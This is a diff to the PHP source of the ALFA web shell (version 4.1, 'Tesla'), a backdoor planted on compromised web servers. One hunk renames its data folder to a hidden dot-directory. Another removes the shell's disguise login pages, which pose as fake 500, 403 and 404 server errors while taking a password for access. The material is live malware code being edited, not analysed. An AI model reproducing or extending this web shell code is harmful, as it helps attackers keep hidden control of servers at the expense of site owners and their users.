@@ -179,7 +179,7 @@ if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'
 define("__ALFA_VERSION__", "4.1");
 define("__ALFA_UPDATE__", "2");
 define("__ALFA_CODE_NAME__", "Tesla");
-define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
+define("__ALFA_DATA_FOLDER__", ".SyaidinaKhaibar");
 define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
@@ -546,36 +546,6 @@ body{background: black;}
 <tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
 <tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
 </div><br /></center>';
-exit;
-}
-}elseif($config['AlfaLoginPage']=='500'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
-@header('location: '.$_SERVER["PHP_SELF"]);
-}
-echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
-exit;
-}
-}elseif($config['AlfaLoginPage']=='403'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
-@header('location: '.$_SERVER["PHP_SELF"]);
-}
-echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
-exit;
-}
-}elseif($config['AlfaLoginPage']=='404'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
-@header('location: '.$_SERVER["PHP_SELF"]);
-}
-echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
 exit;
 }
 }
